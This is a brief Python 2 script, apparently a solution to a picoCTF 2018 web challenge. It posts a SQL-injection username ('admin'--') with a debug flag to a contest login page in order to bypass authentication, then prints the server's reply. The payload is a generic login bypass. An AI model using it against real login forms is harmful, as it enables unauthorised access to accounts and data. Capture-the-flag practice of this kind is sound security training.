# coding=utf-8

import requests
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

r=requests.post('http://2018shell3.picoctf.com:22430/login.php',
  data={
    'username':"admin'--",
    'password':"as",
    'debug':"1"
  }
)
text=r.content.decode('big5')
print text